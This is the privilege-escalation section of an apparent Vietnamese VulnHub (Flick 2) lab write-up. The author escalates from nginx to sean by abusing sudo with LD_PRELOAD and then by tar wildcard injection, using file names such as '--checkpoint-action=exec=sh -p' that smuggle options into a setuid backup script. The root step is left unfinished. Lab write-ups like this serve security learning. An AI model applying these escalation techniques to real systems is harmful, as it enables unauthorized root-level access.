+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="nginx-to-robin"><a href="#nginx-to-robin" class="headerlink" title="nginx to robin"></a><em>nginx</em> to <em>robin</em></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">bash-4.2$ su robin</span><br><span class="line">su robin</span><br><span class="line">Password: 40373df4b7a1f413af61cf7fd06d03a565a51898</span><br><span class="line"></span><br><span class="line">[robin@fII public]$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(robin) gid=1000(robin) groups=1000(robin)</span><br><span class="line"></span><br><span class="line">[robin@fII public]$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for robin on this host:</span><br><span class="line">    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&quot;COLORS</span><br><span class="line">    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1</span><br><span class="line">    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE</span><br><span class="line">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY</span><br><span class="line">    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL</span><br><span class="line">    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;, env_keep+=LD_PRELOAD,</span><br><span class="line">    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin</span><br><span class="line"></span><br><span class="line">User robin may run the following commands on this host:</span><br><span class="line">    (bryan) /usr/local/bin/dice</span><br></pre></td></tr></table></figure>
+<p>User <em>robin</em> có thể chạy <code>/usr/local/bin/dice</code> với quyền của bryan, thêm nữa là cả <code>env_keep+=LD_PRELOAD</code>, mèn ơi… leo lên quyền của <em>bryan</em> thôi.</p>
+<h3 id="robin-to-bryan"><a href="#robin-to-bryan" class="headerlink" title="robin to bryan"></a><em>robin</em> to <em>bryan</em></h3><p>Leo thang đặc quyền với LD_PRELOAD<br><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/">https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[robin@fII ~]$ sudo -u bryan LD_PRELOAD=/home/robin/s.so /usr/local/bin/dice</span><br><span class="line">[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898</span><br><span class="line">sh-4.2$ bash</span><br><span class="line">[bryan@fII robin]$ id</span><br><span class="line">uid=1001(bryan) gid=1001(bryan) groups=1001(bryan)</span><br></pre></td></tr></table></figure>
+<p>Tải linpeas vào máy mục tiêu, kết quả cho ra có đoạn:<br><img src="/2021/06/25/flick2-vulnhub/11.png"><br>Với linpeas, để ý thấy <code>/usr/local/bin/backup</code> được lập lịch chạy lúc 23h hàng ngày, kiểm tra thông tin về file này và chạy xem nó ra cái gì…</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[bryan@fII ~]$ file /usr/local/bin/backup</span><br><span class="line">/usr/local/bin/backup: setuid ELF 64-bit LSB shared object, x86-64,</span><br><span class="line">version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32,</span><br><span class="line">BuildID[sha1]=0xc3cbb4476467a324fd93e428225dbedb5df5e2d3, not stripped</span><br><span class="line"></span><br><span class="line">[bryan@fII ~]$ /usr/local/bin/backup</span><br><span class="line"> * Securing environment</span><br><span class="line"> * Performing database backup...</span><br><span class="line">app/</span><br><span class="line">app/.gitignore</span><br><span class="line">database.sqlite</span><br><span class="line">framework/</span><br><span class="line">framework/cache/</span><br><span class="line">framework/cache/.gitignore</span><br><span class="line">framework/sessions/</span><br><span class="line">framework/sessions/.gitignore</span><br><span class="line">framework/views/</span><br><span class="line">framework/views/.gitignore</span><br><span class="line">logs/</span><br><span class="line">logs/.gitignore</span><br><span class="line">logs/lumen.log</span><br><span class="line"> * Backup done!</span><br></pre></td></tr></table></figure>
+<p>Hmm… có vẻ như <code>/usr/local/bin/backup</code> đang thực hiện nén hết cái list file và folder kia vào đâu đấy, nhưng đâu là đâu?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[bryan@fII ~]$ strings /usr/local/bin/backup</span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">libc.so.6</span><br><span class="line">puts</span><br><span class="line">setresgid</span><br><span class="line">setresuid</span><br><span class="line">system</span><br><span class="line">__cxa_finalize</span><br><span class="line">__libc_start_main</span><br><span class="line">_edata</span><br><span class="line">__bss_start</span><br><span class="line">_end</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__gmon_start__</span><br><span class="line">_Jv_RegisterClasses</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">5B       </span><br><span class="line">%D       </span><br><span class="line">%B       </span><br><span class="line">%:       </span><br><span class="line">%2       </span><br><span class="line">%*       </span><br><span class="line">%&quot;       </span><br><span class="line">fffff.</span><br><span class="line">[]A\A]A^A_</span><br><span class="line"> * Securing environment</span><br><span class="line"> * Backup done!</span><br><span class="line"> * Performing database backup...</span><br><span class="line">PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin; cd /usr/share/nginx/serverchecker/storage; /bin/tar -zvcf /home/sean/backup_$(/bin/date +&quot;%Y%m%d&quot;).tar.gz *;</span><br><span class="line">;*3$&quot;</span><br></pre></td></tr></table></figure>
+<p>Èn, câu lệnh dưới cùng dễ thấy ngay <code>/usr/local/bin/backup</code> nén toàn bộ thư mục <code>/usr/share/nginx/serverchecker/storage</code> vào <code>/home/sean/backup_$(/bin/date +&quot;%Y%m%d&quot;).tar.gz</code> &#x3D;)) nảy ngay đến một từ khoá trong đầu, <strong>Wildcard!</strong></p>
+<h3 id="bryan-to-sean"><a href="#bryan-to-sean" class="headerlink" title="bryan to sean"></a><em>bryan</em> to <em>sean</em></h3><p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/">https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/</a><br>Khi truy cập vào đường dẫn <code>/usr/share/nginx/serverchecker/storage</code>, thư mục này là của user <em>nginx</em>, các user khác đéo có quyền ghi vào đây, ờ, thế à, thế giờ tôi sẽ set luôn permission 777 cho cái thư mục này với Postman, vì low-shell đầu tiên được chạy bởi user <em>nginx</em>.<br><img src="/2021/06/25/flick2-vulnhub/12.png"><br>Giờ thì các user khác thoải mái đọc ghi luôn :D exploit leo quyền!</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[bryan@fII storage]$ echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh -p&quot;</span><br><span class="line">[bryan@fII storage]$ echo &quot;&quot; &gt; --checkpoint=1</span><br><span class="line">[bryan@fII storage]$ ls -al</span><br><span class="line">total 24</span><br><span class="line">drwxrwxrwx.  5 nginx nginx 4096 Jun 25 19:24 .</span><br><span class="line">drwxrwxrwx. 10 nginx nginx 4096 Jun 22  2015 ..</span><br><span class="line">drwxrwxrwx.  2 nginx nginx   23 Jun 22  2015 app</span><br><span class="line">-rw-rw-r--   1 bryan bryan    1 Jun 25 19:24 --checkpoint=1</span><br><span class="line">-rw-rw-r--   1 bryan bryan    1 Jun 25 19:24 --checkpoint-action=exec=sh -p</span><br><span class="line">-rwxrwxrwx.  1 nginx nginx 6144 Jun 25 16:42 database.sqlite</span><br><span class="line">drwxrwxrwx.  5 nginx nginx   45 Jun 22  2015 framework</span><br><span class="line">drwxrwxrwx.  2 nginx nginx   39 Jun 22  2015 logs</span><br><span class="line">[bryan@fII storage]$ /usr/local/bin/backup</span><br><span class="line"> * Securing environment</span><br><span class="line"> * Performing database backup...</span><br><span class="line">app/</span><br><span class="line">app/.gitignore</span><br><span class="line">database.sqlite</span><br><span class="line">framework/</span><br><span class="line">framework/cache/</span><br><span class="line">framework/cache/.gitignore</span><br><span class="line">sh-4.2$ id</span><br><span class="line">uid=1002(sean) gid=1001(bryan) groups=1002(sean),1001(bryan)</span><br></pre></td></tr></table></figure>
+<p>Có shell của <em>sean</em>, tiếp tục để đạt cảnh giới cuối cùng của bài này là root.</p>
+<h3 id="sean-to-root"><a href="#sean-to-root" class="headerlink" title="sean to root"></a><em>sean</em> to <em>root</em></h3><p>Trong thư mục <code>/usr/local/bin/</code> có file <code>restore</code> được set SUID root, và có group <em>sean</em>, như vậy user <em>sean</em> có thể chạy file <code>restore</code> với quyền root. Nếu exploit được đoạn này, tôi có thể có quyền root.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bash-4.2$ cd /usr/local/bin/</span><br><span class="line">bash-4.2$ ls -al</span><br><span class="line">total 1960</span><br><span class="line">drwxr-xr-x.  2 root root       59 Aug 17  2015 .</span><br><span class="line">drwxr-xr-x. 12 root root     4096 Jun 22  2015 ..</span><br><span class="line">-rwsr-x---.  1 sean bryan    8830 Jul  2  2015 backup</span><br><span class="line">-rwxr-xr-x.  1 root root  1107672 Jun 22  2015 composer</span><br><span class="line">-rwx--x--x.  1 root root     8830 Jul  2  2015 dice</span><br><span class="line">-rwsr-x---   1 root sean   866169 Aug 15  2015 restore</span><br></pre></td></tr></table></figure>
+<p>Nhưng tôi đéo :)) làm đến đây tạm tịt. Update sau…</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+              <a href="/tags/write-up/" rel="tag"># write up</a>
+              <a href="/tags/easy/" rel="tag"># easy</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/02/03/dc9-vulnhub/" rel="prev" title="[VulnHub] DC 9">
+                  <i class="fa fa-angle-left"></i> [VulnHub] DC 9
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/06/27/using-computer-safely-talk/" rel="next" title="[Talk] Làm sao để sử dụng máy tính một cách an toàn?">
+                  [Talk] Làm sao để sử dụng máy tính một cách an toàn? <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">minhnq22</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
